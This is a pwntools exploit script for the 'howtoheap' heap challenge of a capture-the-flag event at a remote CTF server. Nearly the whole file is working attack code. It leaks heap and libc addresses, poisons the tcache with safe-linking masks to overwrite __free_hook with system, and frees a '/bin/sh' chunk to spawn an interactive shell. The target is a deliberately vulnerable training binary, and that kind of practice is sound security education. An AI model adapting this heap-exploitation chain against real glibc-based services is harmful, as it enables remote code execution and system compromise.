#!/usr/bin/env python3

from pwn import *

exe = ELF("./howtoheap")

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})

def mask(heapbase, target):
    return target ^ (heapbase >> 0xc)

#r = conn()

sla = lambda a,b : r.sendlineafter(a, b)

def alloc(r, idx, size):
    r.sendlineafter("> ", "1")
    r.sendlineafter("malloc at index: ", str(idx))
    r.sendlineafter("with size: ", str(size))

def fill(r, idx, data):
    r.sendlineafter("> ", "4")
    r.sendlineafter("write to index: ", str(idx))
    r.sendlineafter("of size: ", str(len(data)))
    r.send(data)

def show(r, idx, size):
    r.sendlineafter("> ", "3")
    r.sendlineafter("read at index: ", str(idx))
    r.sendlineafter("of size: ", str(size))

def free(r, idx):
    r.sendline("2")
    r.sendlineafter("free at index: ", str(idx))


def main():
    
        r = remote("chal.cybersecurityrumble.de", 8263)
        #r = conn()


        
        alloc(r, 0, 0x20)
        alloc(r, 1, 0x40)
        alloc(r, 2, 0x40)
        free(r, 2)
        free(r, 1)
        show(r, 0, 0x60)

        r.recv(8*7)
        LEAK = u64(r.recv(8))
        log.warn("tcache_perthread @ 0x%x", LEAK)
    
        HEAP_BASE = LEAK - 0x10

    
        
        alloc(r, 3, 0x30)
        alloc(r, 4, 0x430)
        alloc(r, 5, 0x20)



        free(r, 4)
        show(r, 3, 0x60)
            
        r.recv(0x30+0x10)
        LIBC_LEAK = u64(r.recv(8))
        log.info("main_arena + 96 is %x", LIBC_LEAK)

        pause()

        where = mask(HEAP_BASE + 0x2d0, LIBC_LEAK + 0x9c0) # I added this

        fill(r, 0, p64(0)*5 + p64(0x51) + p64(where) + p64(0))

        alloc(r, 6, 0x40)
        alloc(r, 7, 0x40)

        show(r, 7, 0x8)
        

        stderr = u64(r.recv(8))
        log.info("_IO_2_1_stderr_ @ 0x%x", stderr)
        
        pause()

        alloc(r, 8, 0x10)
        alloc(r, 9, 0x20)
        alloc(r, 10, 0x20)

        free(r, 10)
        free(r, 9)
            

        
        LIBC_BASE = stderr - 0x1c3440
        system = LIBC_BASE + 0x4a830
        __free_hook = LIBC_BASE + 0x1c5ca0


        log.warn("Libc base @ 0x%x", LIBC_BASE)

        fill(r, 8, p64(0)*2 + p64(0) + p64(0x31) + p64(mask(HEAP_BASE + 0x3d0, __free_hook))) #__free_hook

        alloc(r, 11, 0x20)
        alloc(r, 12, 0x20)

            
        fill(r, 12, p64(system)) #system
        
        fill(r, 11, "/bin/sh\x00")

        free(r, 11)

        r.interactive()

if __name__ == "__main__":
    main()
